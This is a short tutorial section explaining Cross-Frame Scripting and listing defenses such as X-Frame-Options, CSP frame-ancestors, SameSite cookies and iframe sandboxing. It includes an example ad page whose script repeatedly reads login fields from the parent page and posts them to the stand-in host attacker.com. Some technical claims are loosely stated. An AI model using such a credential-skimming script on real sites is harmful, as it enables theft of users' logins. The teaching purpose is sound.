
## Cross-Frame Scripting
Cross-Frame Scripting (XFS) is a security vulnerability that occurs when an attacker embeds a legitimate website inside an ```<iframe>``` in the form of ads, videos, or other embedded content on a malicious site. The attacker then tricks users into interacting with the embedded page, potentially leading to :

1. Data theft (e.g., stealing form inputs, passwords).
2. Unauthorized actions (e.g., transferring money, making purchases).

Example :  malicious advertisement iframe attempts to steal credentials from a legitimate website

```
<!DOCTYPE html>
<html>
<head>
    <title>Secure Bank</title>
</head>
<body>
    <h1>Welcome to Secure Bank</h1>
    <form id="loginForm" action="/login" method="post">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required>
        <br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>
        <br>
        <input type="submit" value="Login">
    </form>
    <iframe src="https://ads.external.com" width="300" height="250"></iframe>
</body>
</html>
```

Now consider script look like this, which can steal data your login cred.

```
<!DOCTYPE html>
<html>
<head>
    <title>Advertisement</title>
    <script>
        function stealCredentials() {
            try {
                var mainPage = window.parent.document;
                var username = mainPage.getElementById('username').value;
                var password = mainPage.getElementById('password').value;
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "https://attacker.com/steal", true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.send("username=" + username + "&password=" + password);
            } catch (e) {
                console.log("Unable to access parent document: " + e);
            }
        }
        setInterval(stealCredentials, 1000);
    </script>
</head>
<body>
    <h1>Advertisement</h1>
    <p>Check out our amazing offers!</p>
</body>
</html>

```

Note : Iframe embedded on web site can be both cross site or same site which depends on src of iframe :

**How to prevent XFS:**
1. Set the X-Frame-Options HTTP header to prevent your site from being embedded in iframes.
```
 res.setHeader("X-Frame-Options", "DENY");
```

2. Set a frame-ancestors directive to control which origins can embed your site.

```
 res.setHeader("Content-Security-Policy", "frame-ancestors 'self'");
```

3. Set session cookies with SameSite=Strict to prevent them from being sent in cross-origin requests.

```
res.cookie("session", sessionToken, { httpOnly: true, secure: true, sameSite: "Strict" });
```

4. The sandbox attribute in an ```<iframe>``` provides an extra layer of security by restricting what the embedded content can do.

```
<iframe src="https://example.com" sandbox></iframe>

sandbox :
allow-forms	 : Allows form submissions. 
allow-scripts :	Enables JavaScript execution (but blocks eval()).
etc.
```